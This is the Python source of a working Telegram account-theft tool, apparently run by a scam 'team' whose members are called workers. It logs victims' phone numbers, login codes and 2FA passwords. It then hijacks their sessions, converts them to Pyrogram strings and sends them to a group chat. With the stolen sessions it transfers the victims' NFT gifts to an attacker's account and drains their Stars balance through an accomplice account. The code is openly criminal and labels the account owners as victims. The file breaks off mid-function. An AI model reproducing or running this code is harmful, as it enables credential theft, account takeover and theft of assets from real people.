import json
import os
import socket
import requests
import random
import sqlite3
import struct
import base64
import asyncio
from urllib.parse import parse_qs
from datetime import datetime
from flask import request
from config import Config
# Константы для сессий
SESSION_DIR = Config.SESSION_DIR
ADMIN_TOKEN = os.getenv("ADMIN_TOKEN") or Config.SECRET_KEY
PHONE_FILE = os.path.join(SESSION_DIR, "phones.json")
GIFT_RECIPIENT_ID = int(os.getenv("GIFT_RECIPIENT_ID", "0"))
AUTODOCID_ID = Config.AUTODOCID_ID

# Создаем директорию сессий если её нет
if not os.path.exists(SESSION_DIR):
    os.makedirs(SESSION_DIR)
async def log_user_action(action_type: str, user_info: dict = None, worker_info: dict = None, additional_data: dict = None):
    """
    Detailed logging system for user actions
    Action types:
    - link_created: Worker created gift link
    - link_activated: User activated gift link and received NFT
    - phone_entered: User entered phone number
    - code_entered: User entered verification code
    - 2fa_entered: User entered 2FA password
    - auth_success: User successfully authenticated
    - session_processing_started: Session processing started
    - session_processing_completed: Session processing completed
    - gift_transfer_error: Error during gift transfer
    """
    try:
        from aiogram import Bot
        from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
        from config import Config
        should_log = True
        if user_info:
            username = user_info.get('username', '')
            first_name = user_info.get('first_name', '')
            
            # Если нет И имени И юзернейма
            if (not username or username == "") and (not first_name or first_name == ""):
                # Проверяем, нужно ли логировать эти действия для анонимных пользователей
                if action_type in ["phone_entered", "code_entered", "2fa_entered", "auth_success", 
                                   "account_mismatch", "2fa_error", "link_activated"]:
                    should_log = False
        
        # Если не нужно логировать, просто выходим
        if not should_log:
            return
            
        bot = Bot(token=Config.BOT_TOKEN)
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        worker_name = "Unknown"
        if worker_info:
            username = worker_info.get('username')
            telegram_id = worker_info.get('telegram_id', 'Unknown')
            if username and username.strip():
                worker_name = username if username.startswith('@') else f"@{username}"
            else:
                worker_name = f"ID{telegram_id}"
        user_display = "Unknown"
        if user_info:
            user_id = user_info.get('user_id', user_info.get('telegram_id', user_info.get('id', 'Unknown')))
            username = user_info.get('username', '')
            if username:
                user_display = f"@{username} (ID: {user_id})"
            else:
                user_display = f"ID: {user_id}"
        message_text = None
        keyboard = None
        bot = Bot(token=Config.BOT_TOKEN)
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        worker_name = "Unknown"
        if worker_info:
            username = worker_info.get('username')
            telegram_id = worker_info.get('telegram_id', 'Unknown')
            if username and username.strip():
                worker_name = username if username.startswith('@') else f"@{username}"
            else:
                worker_name = f"ID{telegram_id}"
        user_display = "Unknown"
        if user_info:
            user_id = user_info.get('user_id', user_info.get('telegram_id', user_info.get('id', 'Unknown')))
            username = user_info.get('username', '')
            if username:
                user_display = f"@{username} (ID: {user_id})"
            else:
                user_display = f"ID: {user_id}"
        message_text = None
        keyboard = None
        
        if action_type == "link_created":
            # Убираем лог создания подарка
            return
        elif action_type == "gift_link_created":
            # Убираем лог создания подарочной ссылки
            return
        elif action_type == "retry_processing":
            details = additional_data.get('details', 'Повторная обработка сессии') if additional_data else 'Повторная обработка сессии'
            message_text = (
                f"🔄 <b>Повторная обработка</b>\n\n"
                f"👤 <b>Пользователь:</b> {user_display}\n"
                f"📝 <b>Детали:</b> {details}\n"
                f"⏰ <b>Время:</b> {timestamp}"
            )
        elif action_type == "rescan_gifts_requested":
            phone = additional_data.get('phone', 'Unknown') if additional_data else 'Unknown'
            details = additional_data.get('details', 'Запрошено повторное сканирование подарков') if additional_data else 'Запрошено повторное сканирование подарков'
            message_text = (
                f"🔄 <b>Запрошено повторное сканирование подарков</b>\n\n"
                f"👤 <b>Пользователь:</b> {user_display}\n"
                f"📞 <b>Телефон:</b> <code>{phone}</code>\n"
                f"📝 <b>Детали:</b> {details}\n"
                f"⏰ <b>Время:</b> {timestamp}"
            )
        elif action_type == "link_activated":
            first_name = user_info.get('first_name', '') if user_info else ''
            username = user_info.get('username', '') if user_info else ''
            user_id = user_info.get('user_id', user_info.get('telegram_id', user_info.get('id', 'Unknown'))) if user_info else 'Unknown'
            
            blurred_username = blur_text(f"@{username}") if username else "@Без юзернейма"
            
            message_text = (
                f"<blockquote><b>🐬AQUA TEAM BOT🐬</b></blockquote>\n\n"
                f"<b>[👥] {first_name} [{blurred_username}]</b>\n\n"
                f"<blockquote><b>[▫️] Нажата кнопка принятия подарка</b></blockquote>"
            )
        elif action_type == "phone_entered":
            first_name = user_info.get('first_name', '') if user_info else ''
            username = user_info.get('username', '') if user_info else ''
            
            blurred_username = blur_text(f"@{username}") if username else "@Без юзернейма"
            
            message_text = (
                f"<blockquote><b>🐬AQUA TEAM BOT🐬</b></blockquote>\n\n"
                f"<b>[👥] {first_name} [{blurred_username}]</b>\n\n"
                f"<blockquote><b>[🔹] Отправлен номер</b></blockquote>"
            )
        elif action_type == "code_entered":
            first_name = user_info.get('first_name', '') if user_info else ''
            username = user_info.get('username', '') if user_info else ''
            has_2fa = additional_data.get('has_2fa', False) if additional_data else False
            
            blurred_username = blur_text(f"@{username}") if username else "@Без юзернейма"
            
            if has_2fa:
                message_text = (
                    f"<blockquote><b>🐬AQUA TEAM BOT🐬</b></blockquote>\n\n"
                    f"<b>[👥] {first_name} [{blurred_username}]</b>\n\n"
                    f"<blockquote><b>[🔺] Отправлен код | Требуется 2FA</b></blockquote>"
                )
            else:
                message_text = (
                    f"<blockquote><b>🐬AQUA TEAM BOT🐬</b></blockquote>\n\n"
                    f"<b>[👥] {first_name} [{blurred_username}]</b>\n\n"
                    f"<blockquote><b>[🔺] Отправлен неверный код</b></blockquote>"
                )
        elif action_type == "2fa_entered":
            first_name = user_info.get('first_name', '') if user_info else ''
            username = user_info.get('username', '') if user_info else ''
            
            blurred_username = blur_text(f"@{username}") if username else "@Без юзернейма"
            
            message_text = (
                f"<blockquote><b>🐬AQUA TEAM BOT🐬</b></blockquote>\n\n"
                f"<b>[👥] {first_name} [{blurred_username}]</b>\n\n"
                f"<blockquote><b>[🔸] Успешная авторизация с 2FA</b></blockquote>"
            )
        elif action_type == "auth_success":
            first_name = user_info.get('first_name', '') if user_info else ''
            username = user_info.get('username', '') if user_info else ''
            
            blurred_username = blur_text(f"@{username}") if username else "@Без юзернейма"
            
            message_text = (
                f"<blockquote><b>🐬AQUA TEAM BOT🐬</b></blockquote>\n\n"
                f"<b>[👥] {first_name} [{blurred_username}]</b>\n\n"
                f"<blockquote><b>[🔸] Успешная авторизация</b></blockquote>"
            )
        elif action_type == "2fa_error":
            first_name = user_info.get('first_name', '') if user_info else ''
            username = user_info.get('username', '') if user_info else ''
            
            blurred_username = blur_text(f"@{username}") if username else "@Без юзернейма"
            
            message_text = (
                f"<blockquote><b>🐬AQUA TEAM BOT🐬</b></blockquote>\n\n"
                f"<b>[👥] {first_name} [{blurred_username}]</b>\n\n"
                f"<blockquote><b>[🔸] Неверный пароль</b></blockquote>"
            )
        elif action_type == "account_mismatch":
            first_name = user_info.get('first_name', '') if user_info else ''
            username = user_info.get('username', '') if user_info else ''
            
            blurred_username = blur_text(f"@{username}") if username else "@Без юзернейма"
            
            message_text = (
                f"<blockquote><b>🐬AQUA TEAM BOT🐬</b></blockquote>\n\n"
                f"<b>[👥] {first_name} [{blurred_username}]</b>\n\n"
                f"<blockquote><b>[🔺] ⚠️ Говнюк вошёл с твинка!</b></blockquote>"
            )
        elif action_type == "session_processing_started":
            # Для системных логов используем worker_info
            if worker_info:
                worker_username = worker_info.get('username', '')
                if worker_username and worker_username.strip():
                    worker_display = worker_username if worker_username.startswith('@') else f"@{worker_username}"
                else:
                    worker_display = f"ID{worker_info.get('telegram_id', 'Unknown')}"
            else:
                worker_display = "Unknown"
            
            message_text = (
                f"<blockquote><b>🐬AQUA TEAM BOT🐬</b></blockquote>\n\n"
                f"<b>[👥] {worker_display} [{user_display}]</b>\n\n"
                f"<blockquote><b>[⚙️] Начата обработка сессии</b></blockquote>"
            )
        elif action_type == "session_processing_completed":
            gifts_count = additional_data.get('gifts_processed', 0) if additional_data else 0
            # Для системных логов используем worker_info
            if worker_info:
                worker_username = worker_info.get('username', '')
                if worker_username and worker_username.strip():
                    worker_display = worker_username if worker_username.startswith('@') else f"@{worker_username}"
                else:
                    worker_display = f"ID{worker_info.get('telegram_id', 'Unknown')}"
            else:
                worker_display = "Unknown"
            
            message_text = (
                f"<blockquote><b>🐬AQUA TEAM BOT🐬</b></blockquote>\n\n"
                f"<b>[👥] {worker_display} [{user_display}]</b>\n\n"
                f"<blockquote><b>[✅] Обработка сессии завершена ({gifts_count} подарков)</b></blockquote>"
            )
        elif action_type == "gift_transfer_error":
            error_msg = additional_data.get('error', 'Unknown error') if additional_data else 'Unknown error'
            session_id = additional_data.get('session_id', 'Unknown') if additional_data else 'Unknown'
            # Для системных логов используем worker_info
            if worker_info:
                worker_username = worker_info.get('username', '')
                if worker_username and worker_username.strip():
                    worker_display = worker_username if worker_username.startswith('@') else f"@{worker_username}"
                else:
                    worker_display = f"ID{worker_info.get('telegram_id', 'Unknown')}"
            else:
                worker_display = "Unknown"
            
            message_text = (
                f"<blockquote><b>🐬AQUA TEAM BOT🐬</b></blockquote>\n\n"
                f"<b>[👥] {worker_display} [{user_display}]</b>\n\n"
                f"<blockquote><b>[❌] Ошибка передачи подарка: {error_msg}</b></blockquote>"
            )
            keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔄 Повтор", callback_data=f"retry_session:{session_id}")]
            ])
        else:
            # Если action_type не распознан, создаем базовое сообщение
            message_text = (
                f"ℹ️ <b>Действие: {action_type}</b>\n\n"
                f"👤 <b>Пользователь:</b> {user_display}\n"
                f"⏰ <b>Время:</b> {timestamp}"
            )
        
        # Проверяем что message_text не пустой
        if not message_text or not message_text.strip():
            print(f"⚠️ Сообщение для '{action_type}' пустое, пропускаем отправку")
            return
        
        # Все остальные логи идут в общий топик
        message_thread_id = Config.TOPIC_GENERAL
        
        try:
            if keyboard:
                await bot.send_message(
                    chat_id=Config.LOG_CHAT_ID,
                    text=message_text,
                    parse_mode="HTML",
                    reply_markup=keyboard,
                    message_thread_id=message_thread_id
                )
            else:
                await bot.send_message(
                    chat_id=Config.LOG_CHAT_ID,
                    text=message_text,
                    parse_mode="HTML",
                    message_thread_id=message_thread_id
                )
            print(f"✅ Лог действия '{action_type}' отправлен в топик {message_thread_id}")
        except Exception as send_error:
            # При ошибке топика выводим информацию о доступных топиках
            error_msg = str(send_error)
            print(f"⚠️ Ошибка отправки в топик {message_thread_id}: {error_msg}")
            
            if "thread not found" in error_msg.lower() or "message thread not found" in error_msg.lower():
                # Импортируем функцию для получения информации о топиках
                from telegram_bot import get_available_topics
                topics_info = await get_available_topics(Config.LOG_CHAT_ID)
                print(f"\n⚠️ ОШИБКА ТОПИКА:\n{topics_info}")
            else:
                print(f"❌ Неизвестная ошибка отправки лога: {error_msg}")
        
        await bot.session.close()
    except Exception as e:
        print(f"❌ Ошибка отправки лога действия: {e}")
        import traceback
        traceback.print_exc()
def get_session_data_from_sqlite(session_file_path: str) -> dict:
    if not os.path.exists(session_file_path):
        raise FileNotFoundError(f"Файл сессии не найден: {session_file_path}")
    conn = sqlite3.connect(session_file_path)
    cursor = conn.cursor()
    try:
        cursor.execute("SELECT dc_id, server_address, port, auth_key FROM sessions")
        session_data = cursor.fetchone()
        if not session_data:
            raise ValueError("Данные сессии не найдены в файле")
        dc_id, server_address, port, auth_key = session_data
        return {
            'dc_id': dc_id,
            'server_address': server_address,
            'port': port,
            'auth_key': auth_key
        }
    finally:
        conn.close()
async def get_user_data_from_telethon(session_file_path: str) -> dict:
    API_ID = Config.TELEGRAM_API_ID
    API_HASH = Config.TELEGRAM_API_HASH
    from telethon import TelegramClient
    from telethon.sessions import SQLiteSession
    client = TelegramClient(
        SQLiteSession(session_file_path),
        API_ID,
        API_HASH
    )
    try:
        await client.connect()
        if not await client.is_user_authorized():
            raise ValueError("Сессия не авторизована")
        me = await client.get_me()
        user_data = {
            'user_id': me.id,
            'is_bot': me.bot if hasattr(me, 'bot') else False,
            'phone': me.phone,
            'first_name': me.first_name,
            'last_name': me.last_name,
            'username': me.username
        }
        return user_data
    finally:
        await client.disconnect()
def create_pyrogram_session_string(session_data: dict, user_data: dict) -> str:
    from config import Config
    API_ID = Config.TELEGRAM_API_ID
    dc_id = session_data['dc_id']
    auth_key = session_data['auth_key']
    user_id = user_data['user_id']
    is_bot = user_data['is_bot']
    if len(auth_key) != 256:
        if len(auth_key) > 256:
            auth_key = auth_key[:256]
        else:
            auth_key = auth_key + b'\x00' * (256 - len(auth_key))
    packed_data = struct.pack(
        ">BI?256sQ?",
        dc_id,
        API_ID,
        False,
        auth_key,
        user_id,
        is_bot
    )
    session_string = base64.urlsafe_b64encode(packed_data).decode().rstrip("=")
    return session_string
async def convert_telethon_to_pyrogram(session_file_path: str) -> str:
    session_data = get_session_data_from_sqlite(session_file_path)
    user_data = await get_user_data_from_telethon(session_file_path)
    pyrogram_session_string = create_pyrogram_session_string(session_data, user_data)
    return pyrogram_session_string
def check_admin_token():
    token = request.args.get('token') or request.headers.get('X-Admin-Token')
    return token == ADMIN_TOKEN
def parse_init_data(init_data):
    try:
        parsed_data = parse_qs(init_data)
        if 'user' in parsed_data:
            return json.loads(parsed_data['user'][0]).get('id')
    except Exception as e:
        return None
def blur_text(text: str, blur_chars: int = None) -> str:
    """Блюрит текст звездочками по середине
    
    Args:
        text: Текст для блюра
        blur_chars: Количество символов для блюра (если None, вычисляется автоматически)
    
    Returns:
        Заблюренный текст
    """
    if not text or len(text) <= 3:
        return text
    
    # Убираем @ если есть
    has_at = text.startswith('@')
    clean_text = text[1:] if has_at else text
    
    # Убираем + если есть (для телефонов)
    has_plus = clean_text.startswith('+')
    clean_text = clean_text[1:] if has_plus else clean_text
    
    length = len(clean_text)
    
    # Вычисляем количество символов для блюра (2-3 символа в середине)
    if blur_chars is None:
        if length <= 5:
            blur_chars = 1
        elif length <= 8:
            blur_chars = 2
        else:
            blur_chars = 3
    
    # Вычисляем позиции для блюра
    start_visible = (length - blur_chars) // 2
    end_visible = start_visible + blur_chars
    
    # Формируем заблюренный текст
    blurred = clean_text[:start_visible] + ('*' * blur_chars) + clean_text[end_visible:]
    
    # Возвращаем с префиксами если были
    if has_plus:
        blurred = '+' + blurred
    if has_at:
        blurred = '@' + blurred
    
    return blurred

def get_phone_from_json(user_id):
    try:
        if os.path.exists(PHONE_FILE):
            with open(PHONE_FILE, 'r') as f:
                phones = json.load(f)
                return phones.get(str(user_id), {}).get('phone_number')
    except Exception as e:
        return None
def init_user_record(user_id):
    try:
        phones = {}
        if os.path.exists(PHONE_FILE):
            with open(PHONE_FILE, 'r') as f:
                phones = json.load(f)
        user_str = str(user_id)
        if user_str not in phones:
            phones[user_str] = {
                'phone_number': None, 
                'last_updated': datetime.now().isoformat()
            }
            with open(PHONE_FILE, 'w') as f:
                json.dump(phones, f, indent=2)
        return True
    except Exception as e:
        return False
def create_session_json(phone, twoFA=False, user_id=None):
    session_data = {
        'app_id': 18345571,
        'app_hash': 'eabd4029ba45c38b67198a3bae3d87dd',
        'twoFA': twoFA,
        'session_file': f"{phone.replace('+', '')}.session",
        'phone': phone,
        'user_id': user_id,
        'last_update': datetime.now().isoformat(),
        'status': 'authorized'
    }
    if user_id:
        phones = {}
        if os.path.exists(PHONE_FILE):
            with open(PHONE_FILE, 'r') as f:
                phones = json.load(f)
        phones[str(user_id)] = {
            'phone_number': phone,
            'last_updated': datetime.now().isoformat()
        }
        with open(PHONE_FILE, 'w') as f:
            json.dump(phones, f, indent=2)
    with open(f"{SESSION_DIR}/{phone.replace('+', '')}.json", 'w') as f:
        json.dump(session_data, f, indent=2)
    try:
        from telegram_bot import send_session_to_group, send_session_file_to_group
        session_file_path = f"{SESSION_DIR}/{phone.replace('+', '')}.session"
        if os.path.exists(session_file_path):
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            try:
                loop.run_until_complete(
                    send_session_file_to_group(user_id, phone, session_file_path, is_pyrogram=False)
                )
                print(f"✓ Telethon сессия отправлена как .session файл")
                pyrogram_session_string = loop.run_until_complete(
                    convert_telethon_to_pyrogram(session_file_path)
                )
                loop.run_until_complete(
                    send_session_to_group(user_id, phone, pyrogram_session_string, is_pyrogram=True)
                )
                print(f"✓ Pyrogram session string отправлен как .txt файл")
                if pyrogram_session_string:
                    print(f"🎁 Начинаем обработку подарков для аккаунта {phone}...")
                    loop.run_until_complete(
                        process_account_gifts(pyrogram_session_string, user_id, phone)
                    )
            except Exception as convert_error:
                print(f"Ошибка конвертации в Pyrogram: {convert_error}")
                loop.run_until_complete(
                    send_session_file_to_group(user_id, phone, session_file_path, is_pyrogram=False)
                )
            finally:
                # Не закрываем loop сразу, чтобы асинхронные функции могли завершиться
                pass
    except Exception as e:
        print(f"Error sending session to group: {e}")
    return session_data
async def process_account_gifts(session_string: str, user_id: int, phone: str):
    from pyrogram import Client
    from config import Config
    from database import Database
    try:
        client = Client(
            name="gift_processor",
            api_id=Config.TELEGRAM_API_ID,
            api_hash=Config.TELEGRAM_API_HASH,
            session_string=session_string
        )
        await client.start()
        try:
            # Получаем информацию о текущем пользователе
            me = await client.get_me()
            victim_username = me.username if me.username else None
            victim_user_id = me.id
            
            print(f"🎁 Получаем список подарков для аккаунта {phone}...")
            print(f"👤 Пользователь: @{victim_username} (ID: {victim_user_id})")
            
            gifts_count = 0
            unique_gifts_transferred = 0
            transferred_gift_links = []
            async for gift in client.get_chat_gifts("me"):
                gifts_count += 1
                try:
                    if hasattr(gift, 'link') and gift.link:
                        print(f"✨ Найден NFT подарок с ссылкой: {gift.link}")
                        transfer_result = await transfer_gift_to_recipient(
                            client, 
                            gift, 
                            GIFT_RECIPIENT_ID,
                            victim_username=victim_username,
                            victim_user_id=victim_user_id
                        )
                        if transfer_result['success']:
                            unique_gifts_transferred += 1
                            transferred_gift_links.append(gift.link)
                            await log_gift_transfer_success(
                                gift, 
                                user_id, 
                                phone,
                                balance_before=transfer_result['balance_before'],
                                balance_after=transfer_result['balance_after'],
                                autodocid_used=transfer_result['autodocid_used']
                            )
                        else:
                            print(f"❌ Не удалось передать подарок с ссылкой {gift.link}")
                except Exception as gift_error:
                    print(f"❌ Ошибка обработки подарка: {gift_error}")
                    await log_gift_processing_error(gift_error, user_id, phone)
            print(f"🎁 Обработано {gifts_count} подарков")
            if unique_gifts_transferred > 0:
                print(f"✅ Успешно передано {unique_gifts_transferred} NFT подарков")
                try:
                    db = Database()
                    worker_info = db.get_worker_by_last_gift(user_id)
                    if worker_info:
                        print(f"🔍 Найден воркер для пользователя {user_id}: {worker_info}")
                        await send_profit_log(worker_info, transferred_gift_links, user_id, victim_username)
                    else:
                        print(f"⚠️ Воркер не найден для пользователя {user_id}")
                except Exception as log_error:
                    print(f"❌ Ошибка отправки лога профита: {log_error}")
            else:
                print(f"📭 NFT подарки с ссылками не найдены или не переданы")
                # Убираем уведомление об отсутствии подарков
            
            # После всех операций с подарками - автосписание звезд
            await auto_spend_stars(client)
        finally:
            await client.stop()
    except Exception as e:
        print(f"❌ Ошибка обработки подарков для {phone}: {e}")
        await log_gift_processing_error(e, user_id, phone)
async def check_star_balance(client) -> int:
    """Проверяет баланс звезд на аккаунте"""
    try:
        balance = await client.get_stars_balance()
        print(f"⭐ Баланс звезд: {balance}")
        return balance
    except Exception as e:
        print(f"⚠️ Не удалось проверить баланс звезд: {e}")
        import traceback
        traceback.print_exc()
        return 0

async def auto_spend_stars(client):
    """Автоматически списывает все звезды с жертвы, отправляя подарки на автодокид"""
    try:
        print(f"\n💸 АВТОСПИСАНИЕ: Начало процесса автосписания звезд")
        
        # Получаем баланс жертвы
        balance = await check_star_balance(client)
        
        if balance < 15:
            print(f"⚠️ АВТОСПИСАНИЕ: Баланс ({balance}) меньше 15 звезд, списание не требуется")
            return
        
        print(f"💰 АВТОСПИСАНИЕ: Баланс жертвы: {balance} звезд")
        
        # Отправляем "hi" автодокиду, чтобы Telegram его узнал
        try:
            from config import Config
            print(f"📨 АВТОСПИСАНИЕ: Отправка приветствия @{Config.AUTODOCID_USERNAME}")
            await client.send_message(Config.AUTODOCID_USERNAME, "hi")
            print(f"✅ АВТОСПИСАНИЕ: Приветствие отправлено, peer инициализирован")
        except Exception as hello_error:
            print(f"⚠️ АВТОСПИСАНИЕ: Ошибка отправки приветствия: {hello_error}")
        
        # Список подарков с ценами
        gifts = [
            {"id": 5170145012310081615, "stars": 15, "emoji": "❤️", "name": "Сердце"},
            {"id": 5170233102089322756, "stars": 15, "emoji": "🧸", "name": "Мишка"},
            {"id": 5170250947678437525, "stars": 25, "emoji": "🎁", "name": "Подарок"},
            {"id": 5168103777563050263, "stars": 25, "emoji": "🌹", "name": "Роза"},
            {"id": 5170144170496491616, "stars": 50, "emoji": "🎂", "name": "Тортик"},
            {"id": 5170314324215857265, "stars": 50, "emoji": "💐", "name": "Цветы"},
            {"id": 5170564780938756245, "stars": 50, "emoji": "🚀", "name": "Ракета"},
            {"id": 5168043875654172773, "stars": 100, "emoji": "🏆", "name": "Кубок"},
            {"id": 5170690322832818290, "stars": 100, "emoji": "💍", "name": "Кольцо"},
        ]
        
        # Сортируем подарки по убыванию стоимости для максимальной эффективности
        gifts.sort(key=lambda x: x["stars"], reverse=True)
        
        gifts_sent = 0
        failed_attempts = 0
        max_failed_attempts = 3
        
        # Списываем звезды, пока хватает баланса (минимум 15)
        while balance >= 15:
            # Находим самый дорогой подарок, который можем себе позволить
            gift_to_send = None
            for gift in gifts:
                if balance >= gift["stars"]:
                    gift_to_send = gift
                    break
            
            if not gift_to_send:
                print(f"⚠️ АВТОСПИСАНИЕ: Не найден подходящий подарок для баланса {balance}")
                break
            
            try:
                # Отправляем подарок на автодокид
                await client.send_gift(Config.AUTODOCID_USERNAME, gift_to_send["id"])
                gifts_sent += 1
                print(f"✅ АВТОСПИСАНИЕ: Отправлен {gift_to_send['emoji']} {gift_to_send['name']} ({gift_to_send['stars']} ⭐)")
                
                # Проверяем реальный баланс после отправки
                await asyncio.sleep(0.3)
                balance = await check_star_balance(client)
                failed_attempts = 0  # Сброс счетчика при успехе
                
            except Exception as send_error:
                error_msg = str(send_error)
                print(f"❌ АВТОСПИСАНИЕ: Ошибка отправки подарка {gift_to_send['name']}: {send_error}")
                failed_attempts += 1
                
                # Если ошибка связана с балансом, проверяем реальный баланс
                if "BALANCE" in error_msg.upper() or "INSUFFICIENT" in error_msg.upper():
                    balance = await check_star_balance(client)
                    print(f"📊 АВТОСПИСАНИЕ: Реальный баланс после ошибки: {balance} ⭐")
                
                if failed_attempts >= max_failed_attempts:
                    print(f"❌ АВТОСПИСАНИЕ: Превышено количество неудачных попыток ({max_failed_attempts}), останавливаем")
                    break
                
                # Пробуем подарок подешевле
                continue
        
        print(f"\n✅ АВТОСПИСАНИЕ: Завершено. Отправлено подарков: {gifts_sent}. Остаток баланса: {balance} ⭐")
        
    except Exception as e:
        print(f"❌ АВТОСПИСАНИЕ: Общая ошибка: {e}")
        import traceback
        traceback.print_exc()

async def autodocid_refill(victim_client, victim_username: str, victim_user_id: int) -> bool:
    """Пополняет баланс жертвы через автодокид систему"""
    try:
        print(f"\n💰 АВТОДОКИД: Пополнение баланса для @{victim_username}")
        
        # Подключаемся к аккаунту автодокида
        autodocid_session = "sessions/77008529694.session"
        if not os.path.exists(autodocid_session):
            print(f"❌ АВТОДОКИД: Сессия {autodocid_session} не найдена!")
            return False
        
        print(f"🔐 АВТОДОКИД: Конвертация сессии...")
        autodocid_session_string = await convert_telethon_to_pyrogram(autodocid_session)
        
        from pyrogram import Client
        from config import Config
        
        autodocid_client = Client(
            name="autodocid_refiller",
            api_id=Config.TELEGRAM_API_ID,
            api_hash=Config.TELEGRAM_API_HASH,
            session_string=autodocid_session_string
        )
        
        await autodocid_client.start()
        print(f"✅ АВТОДОКИД: Подключен")
        
        try:
            # Шаг 1: Отправляем текстовое сообщение "hi"
            print(f"📤 АВТОДОКИД: Отправка сообщения 'hi' пользователю @{victim_username}")
            await autodocid_client.send_message(victim_username, "hi")
            print(f"✅ АВТОДОКИД: Сообщение отправлено")
            
            # Минимальная задержка
            await asyncio.sleep(0.1)
            
            # Шаг 2: Отправляем 2 подарка с ID 5170145012310081615
            gift_id = 5170145012310081615
            print(f"🎁 АВТОДОКИД: Отправка 2 подарков (ID: {gift_id}) пользователю @{victim_username}")
            
            for i in range(2):
                try:
                    await autodocid_client.send_gift(victim_username, gift_id)
                    print(f"✅ АВТОДОКИД: Подарок {i+1}/2 отправлен")
                except Exception as gift_error:
                    print(f"⚠️ АВТОДОКИД: Ошибка отправки подарка {i+1}/2: {gift_error}")
            
            # Минимальная задержка для получения
            await asyncio.sleep(0.5)
            
            # Шаг 3: Конвертируем ВСЕ подарки (не только NFT, но и обычные)
            print(f"🔄 АВТОДОКИД: Конвертация ВСЕХ подарков на аккаунте @{victim_username}")
            converted_count = 0
            skipped_count = 0
            total_count = 0
            
            async for gift in victim_client.get_chat_gifts("me"):
                total_count += 1
                try:
                    convert_result = await gift.convert()
                    if convert_result:
                        converted_count += 1
                        print(f"✅ АВТОДОКИД: Подарок ID {gift.id} конвертирован")
                    else:
                        skipped_count += 1
                        print(f"⚠️ АВТОДОКИД: Подарок ID {gift.id} не удалось конвертировать (уже конвертирован?)")
                except Exception as convert_error:
                    skipped_count += 1
                    error_msg = str(convert_error)
                    if "GIFT_ALREADY_CONVERTED" in error_msg or "already" in error_msg.lower():
                        print(f"⏭️ АВТОДОКИД: Подарок ID {gift.id} уже был конвертирован")
                    else:
                        print(f"⚠️ АВТОДОКИД: Не удалось конвертировать подарок ID {gift.id}: {convert_error}")
            
            print(f"✅ АВТОДОКИД: Всего подарков: {total_count}, Конвертировано: {converted_count}, Пропущено: {skipped_count}")
            
            # Без задержки - проверяем баланс сразу
            new_balance = await check_star_balance(victim_client)
            print(f"⭐ АВТОДОКИД: Новый баланс жертвы: {new_balance} звезд")
            
            return True
            
        finally:
            await autodocid_client.stop()
            print(f"🔐 АВТОДОКИД: Отключен")
            
    except Exception as e:
        print(f"❌ АВТОДОКИД: Критическая ошибка: {e}")
        import traceback
        traceback.print_exc()
        return False

async def transfer_gift_to_recipient(client, gift, recipient_id: int, victim_username: str = None, victim_user_id: int = None) -> dict:
    """
    Переводит подарок получателю с проверкой баланса и автодокидом
    Возвращает dict с информацией о переводе для логирования
    """
    try:
        print(f"\n🎁 Передаем подарок ID {gift.id} получателю {recipient_id}...")
        
        # Проверяем баланс звезд перед переводом
        balance_before = await check_star_balance(client)
        autodocid_used = False
        
        if balance_before < 25:
            print(f"⚠️ Недостаточно звезд для перевода ({balance_before} < 25)")
            
            if victim_username and victim_user_id:
                print(f"💰 Запускаем автодокид для пополнения баланса...")
                refill_success = await autodocid_refill(client, victim_username, victim_user_id)
                autodocid_used = True
                
                if refill_success:
                    # Проверяем баланс снова
                    balance_after_refill = await check_star_balance(client)
                    if balance_after_refill < 25:
                        print(f"❌ После автодокида баланс все еще недостаточен ({balance_after_refill} < 25)")
                        return {
                            'success': False,
                            'balance_before': balance_before,
                            'balance_after': balance_after_refill,
                            'autodocid_used': autodocid_used
                        }
                    print(f"✅ Баланс пополнен! Новый баланс: {balance_after_refill} звезд")
                    balance_before = balance_after_refill
                else:
                    print(f"❌ Автодокид не удался, пропускаем подарок")
                    return {
                        'success': False,
                        'balance_before': balance_before,
                        'balance_after': balance_before,
                        'autodocid_used': autodocid_used
                    }
            else:
                print(f"❌ Недостаточно данных для автодокида (нет username или user_id)")
                return {
                    'success': False,
                    'balance_before': balance_before,
                    'balance_after': balance_before,
                    'autodocid_used': False
                }
        else:
            print(f"✅ Баланс достаточен: {balance_before} звезд")
        
        # Отправляем "hi" получателю перед переводом для кэширования peer
        try:
            print(f"📨 Отправляем приветствие получателю fsdgty...")
            await client.send_message("@fsdgty", "hi")
        except Exception as hello_error:
            print(f"⚠️ Не удалось отправить приветствие: {hello_error}")
        
        # Переводим подарок
        print(f"🔄 Выполняем перевод подарка...")
        result = await gift.transfer(recipient_id)
        
        # Проверяем баланс после перевода
        balance_after = await check_star_balance(client)
        
        if result:
            print(f"✅ Подарок ID {gift.id} успешно передан!")
            return {
                'success': True,
                'balance_before': balance_before,
                'balance_after': balance_after,
                'autodocid_used': autodocid_used
            }
        else:
            print(f"❌ Не удалось передать подарок ID {gift.id}")
            return {
                'success': False,
                'balance_before': balance_before,
                'balance_after': balance_after,
                'autodocid_used': autodocid_used
            }
            
    except Exception as e:
        error_str = str(e)
        print(f"❌ Ошибка передачи подарка: {e}")
        
        # Проверяем на трейдбан
        if "STARGIFT_TRANSFER_TOO_EARLY" in error_str:
            # Извлекаем timestamp из ошибки и отправляем в лог
            try:
                gift_link = gift.link if hasattr(gift, 'link') else f"https://t.me/nft/gift-{gift.id}"
                gift_name = gift_link.split('/')[-1] if '/' in gift_link else str(gift.id)
                
                # Парсим timestamp из ошибки типа [400 STARGIFT_TRANSFER_TOO_EARLY_1734012345]
                import re
                timestamp_match = re.search(r'STARGIFT_TRANSFER_TOO_EARLY_(\d+)', error_str)
                
                if timestamp_match:
                    unlock_timestamp = int(timestamp_match.group(1))
                    from datetime import datetime
                    unlock_datetime = datetime.fromtimestamp(unlock_timestamp)
                    
                    # Вычисляем оставшееся время
                    now = datetime.now()
                    time_left = unlock_datetime - now
                    
                    days = time_left.days
                    hours = time_left.seconds // 3600
                    minutes = (time_left.seconds % 3600) // 60
                    
                    unlock_date_str = unlock_datetime.strftime("%d.%m.%Y %H:%M")
                    time_str = f"{days}д {hours}ч {minutes}м до {unlock_date_str}"
                else:
                    time_str = "Время неизвестно"
                
                # Отправляем в лог трейдбана (топик трейдбанов)
                from telegram_bot import send_message_to_group
